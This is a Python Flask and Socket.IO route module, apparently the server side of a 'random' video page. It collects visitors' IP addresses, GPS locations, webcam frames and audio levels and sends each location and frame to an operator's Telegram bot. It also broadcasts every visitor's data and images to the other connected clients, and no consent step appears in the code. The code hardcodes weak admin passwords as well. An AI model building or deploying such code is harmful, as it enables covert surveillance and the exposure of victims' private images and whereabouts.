from flask import Blueprint, render_template, request, session, redirect, url_for
from flask_socketio import emit, join_room
import base64
import os
import requests
from main import socketio

bp = Blueprint('random_route', __name__, url_prefix='/random')

ADMIN_PASSWORD = 'admin123'
CLEAR_PASSWORD = 'arif123'

ADMIN_BOT_TOKEN = os.environ.get('ADMIN_BOT_TOKEN')
ADMIN_CHAT_ID = os.environ.get('ADMIN_CHAT_ID')
ADMIN_BOT_ENABLED = bool(ADMIN_BOT_TOKEN and ADMIN_CHAT_ID)

print(f"🔍 Admin Bot Enabled: {ADMIN_BOT_ENABLED}")
if ADMIN_BOT_ENABLED:
    print(f"🔍 Token: {ADMIN_BOT_TOKEN[:5]}... Chat ID: {ADMIN_CHAT_ID}")

clients = {}

def send_admin_telegram(text, photo_bytes=None):
    if not ADMIN_BOT_ENABLED:
        print("⚠️ Admin bot not enabled")
        return
    try:
        if photo_bytes:
            url = f"https://api.telegram.org/bot{ADMIN_BOT_TOKEN}/sendPhoto"
            response = requests.post(url, data={'chat_id': ADMIN_CHAT_ID}, files={'photo': photo_bytes}, timeout=5)
            print(f"📸 Photo sent: {response.status_code}")
        else:
            url = f"https://api.telegram.org/bot{ADMIN_BOT_TOKEN}/sendMessage"
            response = requests.post(url, data={'chat_id': ADMIN_CHAT_ID, 'text': text, 'parse_mode': 'HTML'}, timeout=5)
            print(f"📨 Message sent: {response.status_code}")
    except Exception as e:
        print(f"❌ Telegram error: {e}")

# ========== ওয়েব রাউট ==========
@bp.route('/')
def index():
    return render_template('random_index.html', admin_bot_enabled=ADMIN_BOT_ENABLED)

@bp.route('/admin')
def admin():
    if not session.get('admin_logged_in'):
        return redirect(url_for('random_route.admin_login'))
    return render_template('random_admin.html', admin_bot_enabled=ADMIN_BOT_ENABLED)

@bp.route('/admin/login', methods=['GET', 'POST'])
def admin_login():
    if request.method == 'POST':
        if request.form.get('password') == ADMIN_PASSWORD:
            session['admin_logged_in'] = True
            return redirect(url_for('random_route.admin'))
        return render_template('random_admin_login.html', error='Wrong password')
    return render_template('random_admin_login.html')

@bp.route('/admin/logout')
def admin_logout():
    session.pop('admin_logged_in', None)
    return redirect(url_for('random_route.admin'))

# ========== Socket.IO ==========
@socketio.on('connect')
def handle_connect():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    ua = request.headers.get('User-Agent')
    print(f"🔌 New connection: {request.sid}, ip={ip}")

    if ip not in clients:
        clients[ip] = {
            'id': ip,
            'ip': ip,
            'user_agent': ua,
            'location': None,
            'last_frame': None,
            'audio_level': 0,
            'sids': [request.sid],
            'offline': False
        }
    else:
        if request.sid not in clients[ip]['sids']:
            clients[ip]['sids'].append(request.sid)
        clients[ip]['offline'] = False
        clients[ip]['user_agent'] = ua

    emit_admin_update()
    emit_public_update()

@socketio.on('disconnect')
def handle_disconnect():
    for ip, data in list(clients.items()):
        if request.sid in data['sids']:
            data['sids'].remove(request.sid)
            if not data['sids']:
                data['offline'] = True
                print(f"📴 User {ip} went offline")
            break
    emit_admin_update()
    emit_public_update()

@socketio.on('ready')
def handle_ready():
    print(f"✅ Received 'ready' from {request.sid}")

@socketio.on('location_update')
def handle_location(data):
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    print(f"📍 LOCATION from {ip}: {data}")
    if ip in clients:
        clients[ip]['location'] = data
        clients[ip]['offline'] = False
        send_admin_telegram(f"📍 Location from {ip}\nLat: {data['lat']}, Lng: {data['lng']}")
        emit_admin_update()
        emit_public_update()

@socketio.on('video_frame')
def handle_video(data):
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    image = data.get('image')
    audio = data.get('audio_volume', 0)
    print(f"🎥 VIDEO from {ip}: audio={audio}, image size={len(image) if image else 0}")
    if ip in clients:
        clients[ip]['last_frame'] = image
        clients[ip]['audio_level'] = audio
        clients[ip]['offline'] = False
        send_admin_telegram(f"🎥 Frame from {ip}\n🔊 Audio: {audio}%", image)
        emit_admin_update()
        emit_public_update()

@socketio.on('admin_join')
def handle_admin_join():
    join_room('admin_room')
    print(f"🛡️ Admin joined room: {request.sid}")
    emit('admin_update', clients, to='admin_room')

def emit_admin_update():
    emit('admin_update', clients, to='admin_room')

def emit_public_update():
    online_clients = {ip: data for ip, data in clients.items() if not data['offline']}
    online_count = len(online_clients)
    offline_count = sum(1 for data in clients.values() if data['offline'])
    for ip, data in clients.items():
        if data['offline']:
            continue
        filtered = {other_ip: other_data for other_ip, other_data in online_clients.items() if other_ip != ip}
        payload = {
            'clients': filtered,
            'online_count': online_count,
            'offline_count': offline_count
        }
        for sid in data['sids']:
            emit('public_update', payload, to=sid)

@socketio.on('clear_data')
def handle_clear(data):
    if data.get('password') == CLEAR_PASSWORD:
        clients.clear()
        emit('clear_all', broadcast=True)
        send_admin_telegram("🗑️ All data cleared by admin")
        emit_admin_update()
        return {'status': 'ok'}
    else:
        return {'status': 'error', 'message': 'Wrong password'}
